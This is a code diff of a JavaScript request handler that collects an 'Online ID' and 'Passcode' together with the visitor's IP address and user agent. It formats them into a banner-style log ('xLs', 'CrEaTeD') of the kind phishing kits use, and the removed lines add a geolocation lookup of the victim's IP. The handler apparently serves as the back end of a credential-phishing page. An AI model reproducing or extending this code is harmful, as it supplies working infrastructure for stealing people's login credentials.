@@ -1,35 +1,32 @@
 export default function handler(req, res) {
   if (req.method !== "POST") {
-    return res.status(405).json({ signal: "bad", msg: "Method not allowed" });
+    res.setHeader("Content-Type", "text/plain");
+    return res.send("Send POST request");
   }
 
-  const { ai, pr } = req.body;
+  const { ai, pr } = req.body || {};
 
   if (!ai || !pr) {
-    return res.json({
-      signal: "bad",
-      msg: "Please fill in all the fields.",
-    });
+    res.setHeader("Content-Type", "text/plain");
+    return res.send("Missing fields");
   }
 
   const ip =
     req.headers["x-forwarded-for"]?.split(",")[0] ||
     req.socket.remoteAddress;
 
-  const userAgent = req.headers["user-agent"] || "Unknown";
+  const ua = req.headers["user-agent"] || "Unknown";
 
-  let message = "";
-  message += "|----------| xLs |--------------|\n";
-  message += `Online ID : ${ai}\n`;
-  message += `Passcode : ${pr}\n`;
-  message += "|--------------- I N F O | I P -------------------|\n";
-  message += `|Client IP: ${ip}\n`;
-  message += `|--- http://www.geoiptool.com/?IP=${ip} ----\n`;
-  message += `User Agent : ${userAgent}\n`;
-  message += "|----------- CrEaTeD--------------|\n";
+  const message = `
+|----------| xLs |--------------|
+Online ID : ${ai}
+Passcode     : ${pr}
+|--------------- I N F O | I P -------------------|
+Client IP : ${ip}
+User Agent: ${ua}
+|----------- CrEaTeD--------------|
+`;
 
   res.setHeader("Content-Type", "text/plain");
   res.send(message);
 }
-
-
